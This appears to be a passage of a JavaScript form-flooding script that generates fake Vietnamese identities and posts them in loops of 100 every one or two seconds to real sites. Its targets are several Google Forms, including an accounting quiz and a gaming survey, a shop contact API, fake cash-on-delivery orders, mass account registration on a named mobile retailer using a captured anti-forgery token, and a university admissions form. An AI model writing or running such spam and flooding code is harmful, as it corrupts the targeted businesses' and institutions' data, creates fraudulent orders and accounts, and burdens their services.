                    "d_phone": sdt,
                    "d_email": email,
                    "c_name": hoten,
                    "c_address": diachi,
                    "c_country": "Việt Nam",
                    "c_city": thanhpho,
                    "c_phone": sdt,
                    "c_email": email,
                    "payment": "cod",
                    "shipping": "company",
                    "comment": "",
                    "checkout": "Thanh Toán"
                },
                function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln(".");
                });
        }
    }, 2000);
}

function timestope() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var s3 = s1[Math.floor(Math.random() * s1.length)];
            s3 = s3.slice(0, s3.length - 1).toLowerCase();
            var email = s3 + s2[Math.floor(Math.random() * s2.length)].toLowerCase() + "@gmail.com";
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("https://proxy.timestope.com:45000/v1/shop/contact", {
                    "name": hoten,
                    "email": email,
                    "comments": "help me"
                },
                function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln(".");
                });
        }
    }, 2000);
}

function formthicuatoi() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var s3 = s1[Math.floor(Math.random() * s1.length)];
            s3 = s3.slice(0, s3.length - 1).toLowerCase();
            var email = s3 + s2[Math.floor(Math.random() * s2.length)].toLowerCase() + "@gmail.com";
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSeroOZV1Z2_cH5cBdIciL_dFxkDdW9zfEtHMFr2ZRyMq5dN4w/formResponse", {
                    "entry.521363429": "Tổng tài sản – Vốn chủ sở hữu",
                    "entry.197454455": "Sai",
                    "entry.1874559875": "Nợ TK 622- chi phí nhân công trực tiếp / Có TK 111",
                    "entry.1554205088": "Đúng",
                    "entry.1259899437": "Đúng",
                    "entry.879160737": "Đúng",
                    "entry.1071704758": "Đúng",
                    "entry.1032432371": "Đúng",
                    "entry.1005766257": "Tài sản ngắn hạn",
                    "entry.354547604": "Tăng nguyên giá TSCĐ",
                    "entry.342948087": "Sai",
                    "entry.910999244": "Giá do hội đồng giao nhận đánh giá trên cơ sở giá thị trường tương đương cộng (+)chi phí liên quan đến việc tiếp nhận",
                    "entry.1410289863": "Tăng giá vốn hàng bán trong kỳ",
                    "entry.537659945": "Ngày 31/10/N",
                    "entry.1463847980": "Ghi tăng giá vốn hàng bán trong kỳ",
                    "entry.1284349198": "Đúng",
                    "entry.1764686404": "Chi phí quản lý DN",
                    "entry.802450400": "Đúng",
                    "entry.350849383": "Sai",
                    "entry.356745575": "Ngày có hiệu lực trên quyết định được thành lập",
                    "entry.2090545102": "Tỷ giá ghi sổ của ngoại tệ tính theo tỷ giá xuất quỹ theo phương pháp bình quân gia quyền di động",
                    "entry.1181394626": "Đơn vị sự nghiệp, tổ chức không sử dụng kinh phí ngân sách nhà nước",
                    "entry.926924200": "Đúng",
                    "entry.1998767757": "Sai",
                    "entry.1209764054": "Đúng",
                    "entry.1222928988": "Bắt buộc phải là 12 tháng dương lịch",
                    "entry.1757170089": "Gia công vật liệu chính",
                    "entry.1777979955": "Đúng",
                    "entry.770998463": "Đúng",
                    "entry.87983372": "Tất cả các câu đều đúng",
                    "entry.1349516553": "Bảng chấm công",
                    "entry.45245001": "Đúng",
                    "entry.177042860": "Cung cấp các thông tin tài chính cho người sử dụng",
                    "entry.1795567129": "Đúng",
                    "entry.1050035165": "Sai",
                    "entry.954285724": "Giá trị bị giảm dần và được chuyển dịch từng phần vào chi phí SXKD",
                    "entry.1090558600": "Trang bị thêm một số chi tiết, bộ phận của TSCĐ",
                    "entry.382156337": "Đúng",
                    "entry.1960173021": "Đúng",
                    "entry.147516071": "Lương sản phẩm và lương thời gian",
                    "entry.521363429_sentinel": "",
                    "entry.197454455_sentinel": "",
                    "entry.1874559875_sentinel": "",
                    "entry.1554205088_sentinel": "",
                    "entry.1259899437_sentinel": "",
                    "entry.879160737_sentinel": "",
                    "entry.1071704758_sentinel": "",
                    "entry.1032432371_sentinel": "",
                    "entry.1005766257_sentinel": "",
                    "entry.354547604_sentinel": "",
                    "entry.342948087_sentinel": "",
                    "entry.910999244_sentinel": "",
                    "entry.1410289863_sentinel": "",
                    "entry.537659945_sentinel": "",
                    "entry.1463847980_sentinel": "",
                    "entry.1284349198_sentinel": "",
                    "entry.1764686404_sentinel": "",
                    "entry.802450400_sentinel": "",
                    "entry.350849383_sentinel": "",
                    "entry.356745575_sentinel": "",
                    "entry.2090545102_sentinel": "",
                    "entry.1181394626_sentinel": "",
                    "entry.926924200_sentinel": "",
                    "entry.1998767757_sentinel": "",
                    "entry.1209764054_sentinel": "",
                    "entry.1222928988_sentinel": "",
                    "entry.1757170089_sentinel": "",
                    "entry.1777979955_sentinel": "",
                    "entry.770998463_sentinel": "",
                    "entry.87983372_sentinel": "",
                    "entry.1349516553_sentinel": "",
                    "entry.45245001_sentinel": "",
                    "entry.177042860_sentinel": "",
                    "entry.1795567129_sentinel": "",
                    "entry.1050035165_sentinel": "",
                    "entry.954285724_sentinel": "",
                    "entry.1090558600_sentinel": "",
                    "entry.382156337_sentinel": "",
                    "entry.1960173021_sentinel": "",
                    "entry.147516071_sentinel": "",
                    "fvv": 1,
                    "draftResponse": [
                        [
                            [null, 950794086, [Math.floor(Math.random() * 50).toString()], , 0],
                            [null, 49217056, [hoten], 0],
                            [null, 822309832, [Math.floor(Math.random() * 5).toString()], 0]
                        ], null, "7038539574043442826", null, null, null, email, 1
                    ],
                    "pageHistory": "0,1",
                    "token": "zwAj_3kBAAA.ZbPUuhEBxzy4V8-o5Q4oRg.ZSb3zX4SA3tTXM-f5Trczw",
                    "fbzx": 7038539574043442826
                },
                function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln(".");
                });
        }
    }, 2000);
}

function hoangha() {
    // setInterval(function() {
    //     for (var i = 0; i < 100; i++) {
    var s3 = s1[Math.floor(Math.random() * s1.length)];
    s3 = s3.slice(0, s3.length - 1).toLowerCase();
    var email = s3 + s2[Math.floor(Math.random() * s2.length)].toLowerCase() + "@gmail.com";
    var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
    // var f1 = ho[Math.floor(Math.random() * ho.length)];
    // var f2 = ten[Math.floor(Math.random() * ten.length)];
    var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
    ngancach = ngancach[[Math.floor(Math.random() * ngancach.length)]];
    var quan = [quanhanoi[Math.floor(Math.random() * quanhanoi.length)], quanhcm[Math.floor(Math.random() * quanhcm.length)]];
    var phuong = [phuonghanoi[Math.floor(Math.random() * phuonghanoi.length)], phuonghcm[Math.floor(Math.random() * phuonghcm.length)]];
    var thanhpho = tinh[Math.floor(Math.random() * tinh.length)];
    var diachi = xa[Math.floor(Math.random() * xa.length)] + ngancach + phuong[Math.floor(Math.random() * phuong.length)] + ngancach + quan[Math.floor(Math.random() * quan.length)] + ngancach + thanhpho;
    $.post("https://hoanghamobile.com/Account/Register", {
            "ReturnUrl": "",
            "__RequestVerificationToken": "njYkAFTykBt7yR4W4N3z1oiiVd0ZsXZpzngT1jjKNTYsT0BegavXkhQl0Nksp6_u7HE5vEeCO-gUl3TKkOGe0R0pK0U1",
            "UserName": s3 + s2[Math.floor(Math.random() * s2.length)].toLowerCase(),
            "Title": hoten,
            "PasswordHash": "123123a",
            "SecurityStamp": "123123a",
            "Email": email,
            "Sex": "true",
            "UserBirthDate": "08/06/2021",
            "PhoneNumber": sdt,
            "Address": diachi,
            "SystemCityID": 59,
            "SystemDistrictID": 670
        },
        function(data, status) {
            // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
            document.writeln(".");
        });
    //     }
    // }, 2000);
}

function khaosatlienquan() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSeaOyqTDsyhinNSMaKJDbGeBepr3UX1_Tzkr82FqZuxR7GquA/formResponse", {
                    "entry.1811434302": "ADC",
                    "entry.1015373361": "Rất hài lòng",
                    "entry.980345942": "Gần đây vẫn chơi, nhiều hơn 3 tháng",
                    "entry.1098493621": "Nhất định chơi tiếp",
                    "entry.2057384324": "Thường xuyên xem giải đấu",
                    "entry.472846001": "Quan tâm tới đội tuyển và cả tuyển thủ",
                    "entry.550396008": "Team Flash",
                    "entry.1720767377": "Khung viền avatar",
                    "entry.1015373361_sentinel": "",
                    "entry.980345942_sentinel": "",
                    "entry.1098493621_sentinel": "",
                    "entry.2057384324_sentinel": "",
                    "entry.472846001_sentinel": "",
                    "entry.550396008_sentinel": "",
                    "entry.1720767377_sentinel": "",
                    "fvv": 1,
                    "draftResponse": [null, null, "5351757667676015334"],
                    "pageHistory": 0,
                    "fbzx": 5351757667676015334
                },
                function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln(".");
                });
        }
    }, 2000);
}

function tuyensinhukb() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            var khoa = ["Quản trị dịch vụ du lịch và lữ hành",
                "Quản trị kinh doanh ",
                "Luật kinh tế ",
                "Ngôn ngữ Anh ",
                "Công nghệ thông tin ",
                "Kế toán",
                "Tài chính – Ngân hàng",
                "Công nghệ kỹ thuật điện tử – viễn thông",
                "Thiết kế đồ họa",
                "Thiết kế thời trang ",
                "Quản lý nhà nước ",
                "Quản lý xây dựng ",
                "Kiến trúc ",
                "Quản lý kinh tế",
                "Đào tạo trình độ Cử nhân",
                "Đào tạo trình độ Thạc sĩ"
            ];
            var rdkhoa = khoa[Math.floor(Math.random() * khoa.length)]
            $.post("https://api.form.ladipage.com/sendform", {
                    "form_config_id": "60b37304eba2a30012e657cf",
                    "ladipage_id": "60b35b45eba2a30012e64c6b",
                    "tracking_form": [{
                            "name": "url_page",
                            "value": "http://dk.kinhbac.daotaodh.edu.vn/"
                        },
                        { "name": "utm_source", "value": "" },
                        { "name": "utm_medium", "value": "" },
                        { "name": "utm_campaign", "value": "" },
                        { "name": "utm_term", "value": "" },
                        { "name": "utm_content", "value": "" },
                        { "name": "variant_url", "value": "" },
                        { "name": "variant_content", "value": "" }
                    ],
                    "form_data": [{ "name": "name", "value": hoten },
                        { "name": "phone", "value": sdt },
                        {
                            "name": "form_item695",
                            "value": rdkhoa
                        }
                    ],
                    "data_key": null,
                    "status_send": 2,
                    "total_revenue": 0,
                    "time_zone": 7
                },
                function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln("*");
                });
        }
    }, 2000);
}

function pcgaming() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            var linkfb = "https://www.facebook.com/1000" + randomso(12345671521, 99998789879).toString() + "/posts/" + randomso(123451671521, 999988789879).toString();
            $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfAbOVBqX7y5f7D4qNhBZF_7bmYLGX7fnfTZ0ZaKtt08yfa-A/formResponse", {
                    "entry.2093581830": hoten,
                    "entry.1548666864": sdt,
                    "entry.921745366": linkfb,
                    "entry.1041929247": randomso(101, 999).toString(),
                    "entry.290679934": "tất cả các đáp án trên",
                    "entry.290679934_sentinel": "",
                    "fvv": 1,
                    "draftResponse": [null, null, "4381790413012145173"],
                    "pageHistory": 0,
                    "fbzx": 4381790413012145173
                },
                /*function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln(".");
                }*/
            );
        }
    }, 1000);
}

$(document).ready(function() {
    $("button").click(function() {
        //auto();
        //var x = Math.floor(Math.random() * 10000000).toString();
        var url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeW1st8WQeutS5zakWPbGUbD8TOW8Rw6zV8wKHfZulBA7T1Yw/formResponse";
        // formkhaosat(url);
        // hanoicomputer();
        // tncstore();
        // timestope();
        // formthicuatoi();
        // hoangha();
        // khaosatlienquan();
        //tuyensinhukb();
        pcgaming();
    });
});